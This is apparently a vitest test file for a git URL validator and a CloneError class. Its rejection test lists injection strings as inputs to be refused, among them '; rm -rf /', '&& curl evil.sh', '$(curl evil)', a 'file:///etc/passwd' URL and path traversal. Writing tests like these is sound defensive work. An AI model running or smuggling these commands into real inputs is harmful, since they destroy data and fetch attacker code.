import { describe, it, expect } from 'vitest';
import { isValidGitUrl, CloneError } from './git.js';

describe('git URL validation', () => {
  it('accepts https and ssh URLs', () => {
    expect(isValidGitUrl('https://github.com/example/my-api')).toBe(true);
    expect(isValidGitUrl('https://github.com/example/my-api.git')).toBe(true);
    expect(isValidGitUrl('https://gitlab.com/a/b.git')).toBe(true);
    expect(isValidGitUrl('git@github.com:example/my-api.git')).toBe(true);
  });

  it('rejects non-git schemes and shell metacharacters', () => {
    expect(isValidGitUrl('file:///etc/passwd')).toBe(false);
    expect(isValidGitUrl('http://insecure.com/a/b')).toBe(false);
    expect(isValidGitUrl('https://github.com/a/b; rm -rf /')).toBe(false);
    expect(isValidGitUrl('https://github.com/a/b && curl evil.sh')).toBe(false);
    expect(isValidGitUrl('$(curl evil)')).toBe(false);
    expect(isValidGitUrl('../../etc')).toBe(false);
    expect(isValidGitUrl('')).toBe(false);
  });

  it('CloneError carries a message', () => {
    const e = new CloneError('Repository clone failed: boom');
    expect(e.message).toContain('clone failed');
    expect(e.name).toBe('CloneError');
  });
});
